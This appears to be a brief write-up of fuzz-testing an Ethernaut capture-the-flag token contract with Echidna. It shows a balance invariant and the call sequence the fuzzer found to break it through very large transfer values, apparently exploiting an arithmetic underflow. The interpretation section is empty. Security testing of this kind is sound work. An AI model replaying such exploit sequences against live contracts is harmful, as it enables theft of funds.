## What did echidna find when testing the Ethernaut challenge?

### What was it testing?
The specific invariant being checked was the player's balance. In order to break the CTF we needed to violate the condition of a user's balance limit of 1,000,000, therefore this was the function:
```
    function echidna_isCompleted() public view returns (bool) {

        return balanceOf[player] <= 1000000;
    }
```

### Echidna results
The tool found this path to achieve the condition violation:
```
Call sequence:
   approve(0x20000,167133266616215219087984434971341992939411184825004473792248855581927478929) from: 0x0000000000000000000000000000000000030000 Time delay: 440097 seconds Block delay: 127
   transferFrom(0x30000,0xffffffff,671) from: 0x0000000000000000000000000000000000020000 Time delay: 355645 seconds Block delay: 32767
   transfer(0x10000,115792089237316195423570985008687907853269984665640564039457584007913129638936) from: 0x0000000000000000000000000000000000020000 Time delay: 297507 seconds Block delay:    
   transfer(0x30000,71834082248646112960033315906464535836812324211014610942410955687412905560741) from: 0x0000000000000000000000000000000000010000 Time delay: 358061 seconds Block delay: 33200
```

### Results interpretation
